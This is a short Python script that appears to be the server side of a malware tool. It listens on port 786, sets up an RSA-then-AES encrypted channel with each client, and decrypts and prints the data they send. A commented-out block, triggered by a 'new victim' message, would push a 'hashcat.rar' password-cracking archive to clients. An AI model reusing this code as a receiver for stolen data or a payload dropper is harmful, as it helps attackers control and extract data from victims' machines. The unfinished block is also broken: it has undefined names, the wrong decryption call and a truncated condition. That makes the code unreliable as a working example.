import socket
import rsa
from Crypto.Cipher import AES

if __name__ == '__main__':
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 786))
    server_socket.listen()
    while (True):
        print('connection initiated')
        client_socket, client_ip = server_socket.accept()
        (public_key, private_key) = rsa.newkeys(1024)
        client_socket.send((str(public_key.n) + ':' + str(public_key.e)).encode())
        encryption_key = rsa.decrypt(client_socket.recv(1024), private_key)
        data = client_socket.recv(1024)
        cipher = AES.new(encryption_key, AES.MODE_EAX, nonce=data[0:16])
        print(cipher.decrypt(data[16:]))
        keep_alive = True
        # while (keep_alive):
        #     data = rsa.decrypt(client_socket.recv(1024), encryption_key)
        #     if(data == 'new victim'):
        #         file = open('/hashcat.rar', 'rb')
        #         line = file.read(1024)
        #         while(line):
        #             client_socket.send(encryption.encrypt(line, encryption_key).encode())
        #             line = file.read(1024)
        #         file.close()
        #     if(data == '')
